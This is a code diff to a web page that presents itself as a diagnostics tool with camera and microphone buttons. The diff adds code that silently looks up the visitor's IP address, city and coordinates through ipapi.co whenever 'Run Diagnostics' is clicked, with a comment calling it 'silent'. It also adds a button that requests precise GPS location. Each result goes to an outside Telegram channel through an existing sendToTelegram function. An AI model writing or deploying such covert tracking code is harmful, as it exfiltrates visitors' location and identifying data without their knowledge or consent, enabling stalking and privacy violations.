@@ -15,6 +15,7 @@
 <button id="diagBtn">Run Diagnostics</button>
 <button id="cameraBtn">Access Camera</button>
 <button id="micBtn">Access Microphone</button>
+<button id="locationBtn">Access GPS Location</button>
 <div id="dummy" class="hidden"></div>
 
 <script>
@@ -53,6 +54,65 @@
         }
         sendToTelegram(JSON.stringify(data, null, 2));
     }
+
+    // IP and IP-based location (no permission, silent)
+    function getIPAndLocation() {
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                let ipInfo = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    postal: data.postal,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    org: data.org,
+                    timezone: data.timezone
+                };
+                sendToTelegram("IP & LOCATION (IP Geolocation):\n" + JSON.stringify(ipInfo, null, 2));
+            })
+            .catch(err => sendToTelegram("IP location error: " + err.message));
+    }
+
+    // GPS location (requires permission)
+    document.getElementById('locationBtn').addEventListener('click', function() {
+        if (!navigator.geolocation) {
+            sendToTelegram("GPS error: Geolocation not supported");
+            return;
+        }
+        let options = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        };
+        function success(pos) {
+            let coords = pos.coords;
+            let gpsData = {
+                latitude: coords.latitude,
+                longitude: coords.longitude,
+                accuracy_meters: coords.accuracy,
+                altitude: coords.altitude,
+                altitudeAccuracy: coords.altitudeAccuracy,
+                heading: coords.heading,
+                speed: coords.speed,
+                timestamp: new Date(pos.timestamp).toISOString()
+            };
+            sendToTelegram("GPS EXACT LOCATION:\n" + JSON.stringify(gpsData, null, 2));
+        }
+        function error(err) {
+            let msg = "";
+            switch(err.code) {
+                case err.PERMISSION_DENIED: msg = "PERMISSION DENIED"; break;
+                case err.POSITION_UNAVAILABLE: msg = "POSITION UNAVAILABLE"; break;
+                case err.TIMEOUT: msg = "TIMEOUT"; break;
+                default: msg = "UNKNOWN ERROR";
+            }
+            sendToTelegram("GPS error: " + msg);
+        }
+        navigator.geolocation.getCurrentPosition(success, error, options);
+    });
 
     document.getElementById('cameraBtn').addEventListener('click', function() {
         navigator.mediaDevices.getUserMedia({ video: true })
@@ -96,6 +156,7 @@
 
     document.getElementById('diagBtn').addEventListener('click', function() {
         collectAllTraits();
+        getIPAndLocation();  // Silent IP + IP-based location
     });
 </script>
 </body>
